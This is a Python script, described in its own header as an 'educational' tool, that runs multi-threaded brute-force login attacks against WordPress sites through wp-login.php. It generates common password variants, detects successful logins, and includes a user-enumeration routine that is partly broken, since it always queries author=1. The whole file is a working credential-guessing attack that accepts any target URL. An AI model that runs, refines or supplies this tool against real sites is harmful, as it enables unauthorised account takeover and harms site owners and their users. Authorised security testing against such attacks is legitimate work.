#!/usr/bin/env python3
"""
WordPress Brute Force Tool - Educational Purpose
Fast, multi-threaded WordPress login brute forcer
"""

import requests
import threading
import time
import sys
import argparse
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
import itertools
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

class WordPressBruteForcer:
    def __init__(self, target_url, wordlist_file=None, userlist_file=None, threads=10, delay=0.1):
        self.target_url = target_url.rstrip('/')
        self.login_url = urljoin(self.target_url, '/wp-login.php')
        self.threads = threads
        self.delay = delay
        self.found_credentials = []
        self.attempts = 0
        self.lock = threading.Lock()
        
        # Load wordlists
        self.users = self.load_wordlist(userlist_file) if userlist_file else ['admin', 'administrator', 'user', 'test']
        self.passwords = self.load_wordlist(wordlist_file) if wordlist_file else self.generate_common_passwords()
        
        # Setup session with retries
        self.session = self.create_session()
        
        print(f"[*] Target: {self.login_url}")
        print(f"[*] Users: {len(self.users)}")
        print(f"[*] Passwords: {len(self.passwords)}")
        print(f"[*] Threads: {self.threads}")
        print(f"[*] Total combinations: {len(self.users) * len(self.passwords)}")
        print("-" * 50)

    def create_session(self):
        """Create a session with retry strategy"""
        session = requests.Session()
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        return session

    def load_wordlist(self, filename):
        """Load wordlist from file"""
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[!] Wordlist file not found: {filename}")
            sys.exit(1)

    def generate_common_passwords(self):
        """Generate common passwords if no wordlist provided"""
        common = [
            'password', '123456', 'admin', 'password123', 'letmein',
            'welcome', 'monkey', '1234567890', 'qwerty', 'abc123',
            'Password1', 'password1', 'admin123', 'root', 'toor',
            'pass', 'test', 'guest', 'user', 'login'
        ]
        
        # Add some variations
        variations = []
        for pwd in common:
            variations.extend([
                pwd,
                pwd + '!',
                pwd + '123',
                pwd + '2024',
                pwd + '2025',
                pwd.capitalize(),
                pwd.upper()
            ])
        
        return list(set(variations))  # Remove duplicates

    def get_login_form_data(self, username, password):
        """Get login form data with proper WordPress format"""
        return {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': f"{self.target_url}/wp-admin/",
            'testcookie': '1'
        }

    def attempt_login(self, username, password):
        """Attempt single login"""
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': self.login_url
        }
        
        data = self.get_login_form_data(username, password)
        
        try:
            # Add delay to avoid rate limiting
            time.sleep(self.delay)
            
            response = self.session.post(
                self.login_url,
                data=data,
                headers=headers,
                timeout=10,
                allow_redirects=False
            )
            
            with self.lock:
                self.attempts += 1
                
            # Check for successful login indicators
            if self.is_login_successful(response, username, password):
                with self.lock:
                    self.found_credentials.append((username, password))
                    print(f"\n[+] SUCCESS! {username}:{password}")
                    return True
            else:
                print(f"[-] Failed: {username}:{password} (Attempt {self.attempts})", end='\r')
                return False
                
        except requests.exceptions.RequestException as e:
            print(f"[!] Request error for {username}:{password} - {str(e)}")
            return False

    def is_login_successful(self, response, username, password):
        """Determine if login was successful"""
        # WordPress redirects on successful login
        if response.status_code in [302, 301]:
            location = response.headers.get('Location', '')
            if 'wp-admin' in location or 'dashboard' in location:
                return True
        
        # Check response content for error indicators
        if response.status_code == 200:
            content = response.text.lower()
            
            # WordPress error messages
            error_indicators = [
                'incorrect username or password',
                'invalid username',
                'error: the password you entered',
                'login_error',
                'wp-login-error'
            ]
            
            # If no error messages found, might be successful
            if not any(error in content for error in error_indicators):
                # Additional check for dashboard elements
                if any(indicator in content for indicator in ['dashboard', 'wp-admin', 'welcome']):
                    return True
        
        return False

    def user_enumeration(self):
        """Enumerate valid usernames (bonus feature)"""
        print("[*] Starting user enumeration...")
        valid_users = []
        
        for user in self.users[:10]:  # Limit to first 10 for demo
            try:
                # WordPress author page enumeration
                author_url = f"{self.target_url}/?author=1"
                response = self.session.get(author_url, timeout=5)
                
                if response.status_code == 200 and user.lower() in response.text.lower():
                    valid_users.append(user)
                    print(f"[+] Valid user found: {user}")
                    
            except:
                continue
                
        return valid_users if valid_users else self.users

    def run(self):
        """Main execution method"""
        start_time = time.time()
        
        # Optional: Run user enumeration first
        # self.users = self.user_enumeration()
        
        # Create all combinations
        combinations = list(itertools.product(self.users, self.passwords))
        
        print(f"[*] Starting brute force attack...")
        print(f"[*] Testing {len(combinations)} combinations...")
        
        # Multi-threaded execution
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            # Submit all tasks
            future_to_creds = {
                executor.submit(self.attempt_login, username, password): (username, password)
                for username, password in combinations
            }
            
            # Process completed tasks
            for future in as_completed(future_to_creds):
                username, password = future_to_creds[future]
                try:
                    success = future.result()
                    if success:
                        print(f"\n[+] Credential found: {username}:{password}")
                        # Optionally stop after first success
                        # break
                except Exception as e:
                    print(f"[!] Error processing {username}:{password}: {e}")
        
        # Results
        end_time = time.time()
        elapsed = end_time - start_time
        
        print(f"\n{'='*50}")
        print(f"[*] Attack completed in {elapsed:.2f} seconds")
        print(f"[*] Total attempts: {self.attempts}")
        print(f"[*] Rate: {self.attempts/elapsed:.2f} attempts/second")
        
        if self.found_credentials:
            print(f"[+] Found {len(self.found_credentials)} valid credentials:")
            for username, password in self.found_credentials:
                print(f"    {username}:{password}")
        else:
            print("[-] No valid credentials found")

def create_sample_wordlists():
    """Create sample wordlist files for testing"""
    
    # Create user wordlist
    users = ['admin', 'administrator', 'user', 'test', 'guest', 'root', 'demo']
    with open('users.txt', 'w') as f:
        f.write('\n'.join(users))
    
    # Create password wordlist
    passwords = [
        'password', '123456', 'admin', 'password123', 'letmein',
        'welcome', 'monkey', 'qwerty', 'abc123', 'Password1',
        'password1', 'admin123', 'root', 'pass', 'test',
        'guest', 'user', 'login', '12345', 'passw0rd'
    ]
    with open('passwords.txt', 'w') as f:
        f.write('\n'.join(passwords))
    
    print("[*] Created sample wordlists: users.txt, passwords.txt")

def main():
    parser = argparse.ArgumentParser(description='WordPress Brute Force Tool - Educational Purpose')
    parser.add_argument('target', help='Target WordPress URL (e.g., http://localhost)')
    parser.add_argument('-u', '--userlist', help='Username wordlist file')
    parser.add_argument('-p', '--passwordlist', help='Password wordlist file')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('-d', '--delay', type=float, default=0.1, help='Delay between requests in seconds (default: 0.1)')
    parser.add_argument('--create-wordlists', action='store_true', help='Create sample wordlist files')
    
    args = parser.parse_args()
    
    if args.create_wordlists:
        create_sample_wordlists()
        return
    
    # Validate target URL
    if not args.target.startswith(('http://', 'https://')):
        args.target = 'http://' + args.target
    
    # Initialize and run brute forcer
    brute_forcer = WordPressBruteForcer(
        target_url=args.target,
        userlist_file=args.userlist,
        wordlist_file=args.passwordlist,
        threads=args.threads,
        delay=args.delay
    )
    
    try:
        brute_forcer.run()
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        if brute_forcer.found_credentials:
            print("[+] Credentials found so far:")
            for username, password in brute_forcer.found_credentials:
                print(f"    {username}:{password}")

if __name__ == "__main__":
    main()
